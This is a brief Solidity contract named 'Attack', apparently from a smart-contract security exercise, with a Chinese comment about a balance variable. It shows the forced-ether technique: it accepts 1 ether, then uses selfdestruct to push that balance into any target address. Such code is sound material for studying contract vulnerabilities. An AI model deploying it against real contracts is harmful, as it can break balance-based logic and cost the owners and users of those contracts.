pragma solidity ^0.4.21;

contract Attack{

    function() payable{
        require(msg.value==1 ether);
    }

    function destruct(address add) public{
        selfdestruct(add);
    }

    uint public b = address(this).balance;//此方法 返回 一直为0 
    
    function balance() public returns(uint256){

        uint256 c =address(this).balance;
        return c;
    } 


}